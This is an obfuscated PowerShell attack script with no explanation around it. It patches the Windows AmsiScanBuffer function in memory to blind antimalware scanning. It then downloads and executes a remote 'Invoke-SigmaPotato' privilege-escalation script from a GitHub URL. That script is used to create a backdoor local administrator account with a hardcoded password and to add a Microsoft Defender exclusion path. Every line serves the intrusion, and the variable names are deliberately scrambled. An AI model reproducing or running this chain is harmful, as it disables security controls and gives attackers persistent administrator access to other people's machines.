
#Rasta-mouses Amsi-Scan-Buffer patch \n
$X_cmC__DPXvWM1 = @"
using System;
using System.Runtime.InteropServices;
public class X_cmC__DPXvWM1 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr oqrIZ2tYUWZ9, string W_hl);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr bJgBSCkPezxDx4nS, UIntPtr fZm0s_i, uint ndqe27P, out uint j6sYv6ZZnTZ5XiECQ);
}
"@

Add-Type $X_cmC__DPXvWM1

$bbBKD59t1OtQ1Z2Lg = [X_cmC__DPXvWM1]::LoadLibrary("$([chAr]([BYte]0x61)+[Char](109)+[cHar](115+107-107)+[CHaR]([bYTE]0x69)+[cHaR](46*41/41)+[cHAR](33+67)+[CHAR]([bYte]0x6c)+[CHAr](108*6/6))")
$fz2CC = [X_cmC__DPXvWM1]::GetProcAddress($bbBKD59t1OtQ1Z2Lg, "$([cHaR](65*37/37)+[cHar](92+17)+[ChAR](103+12)+[Char](28+77)+[Char](83*59/59)+[CHaR]([Byte]0x63)+[CHAR]([byTe]0x61)+[Char](110+103-103)+[chaR](66+36-36)+[cHar](117*11/11)+[ChaR](102+36-36)+[Char](9+93)+[CHAr](101)+[ChAr](114))")
$p = 0
[X_cmC__DPXvWM1]::VirtualProtect($fz2CC, [uint32]5, 0x40, [ref]$p)
$gR3_udzAByhuL76 = "0xB8"
$RpiZROkq4 = "0x57"
$n_cbr1QqdbeOlC9GoUx_ = "0x00"
$faYA9HGHP5N_s4yAsp8C = "0x07"
$qcva = "0x80"
$IhCFAv5Rh9vIC4 = "0xC3"
$Rq_xNYZLOQJeV = [Byte[]] ($gR3_udzAByhuL76,$RpiZROkq4,$n_cbr1QqdbeOlC9GoUx_,$faYA9HGHP5N_s4yAsp8C,+$qcva,+$IhCFAv5Rh9vIC4)
[System.Runtime.InteropServices.Marshal]::Copy($Rq_xNYZLOQJeV, 0, $fz2CC, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"







